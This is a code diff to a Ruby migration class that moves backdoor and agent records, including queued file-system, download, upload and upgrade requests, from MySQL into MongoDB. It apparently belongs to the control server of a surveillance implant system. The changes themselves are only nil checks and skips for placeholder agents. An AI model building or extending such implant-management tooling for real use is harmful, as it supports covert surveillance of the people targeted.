@@ -25,10 +25,13 @@ class BackdoorMigration
       
       # skip item if already migrated
       next if Item.count(conditions: {_mid: backdoor[:backdoor_id], _kind: kind}) != 0
-      
+
+      # check that the agent instance really exists (do not migrate dumb (1) placeholders)
+      next if backdoor[:instance].empty? and kind == 'agent'
+
       trace :info, "Migrating backdoor '#{backdoor[:backdoor]}'." if verbose
       print "." unless verbose
-      
+
       mb = ::Item.new
       mb[:_mid] = backdoor[:backdoor_id]
       mb.name = backdoor[:backdoor]
@@ -40,7 +43,8 @@ class BackdoorMigration
       mb.ident = backdoor[:build]
       build_no = backdoor[:build].sub("RCS_", "").to_i
       global.counter = build_no if build_no > global.counter
-      
+
+
       mb.instance = backdoor[:instance].downcase if kind == 'agent'
       mb.version = backdoor[:version].to_i if kind == 'agent'
       
@@ -89,6 +93,7 @@ class BackdoorMigration
     filesystems = DB.instance.mysql_query('SELECT * from `filesystem` ORDER BY `filesystem_id`;').to_a
     filesystems.each do |fs|
       agent = Item.where({_mid: fs[:backdoor_id], _kind: 'agent'}).first
+      next if agent.nil?
       begin
         agent.filesystem_requests.create!(path: fs[:path], depth: fs[:depth])
       rescue Mongoid::Errors::Validations => e
@@ -106,6 +111,7 @@ class BackdoorMigration
     downloads = DB.instance.mysql_query('SELECT * from `download` ORDER BY `download_id`;').to_a
     downloads.each do |dw|
       agent = Item.where({_mid: dw[:backdoor_id], _kind: 'agent'}).first
+      next if agent.nil?
       begin
         agent.download_requests.create!(path: dw[:filename])
       rescue Mongoid::Errors::Validations => e
@@ -123,6 +129,7 @@ class BackdoorMigration
     upgrades = DB.instance.mysql_query('SELECT * from `upgrade` ORDER BY `upgrade_id`;').to_a
     upgrades.each do |ug|
       agent = Item.where({_mid: ug[:backdoor_id], _kind: 'agent'}).first
+      next if agent.nil?
 
       next if agent.upgradable == true
 
@@ -141,6 +148,7 @@ class BackdoorMigration
     stats = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
     stats.each do |up|
       agent = Item.where({_mid: up[:backdoor_id], _kind: 'agent'}).first
+      next if agent.nil?
       begin
         upload = agent.upload_requests.create!(filename: up[:filename])
         upload[:_grid] = [ GridFS.put(up[:content], {filename: up[:filename]}) ]
@@ -161,6 +169,7 @@ class BackdoorMigration
     stats= DB.instance.mysql_query('SELECT * from `stat` ORDER BY `backdoor_id`;').to_a
     stats.each do |st|
       agent = Item.where({_mid: st[:backdoor_id], _kind: 'agent'}).first
+      next if agent.nil?
 
       next unless agent.stat.nil? or agent.stat.source.nil?
 
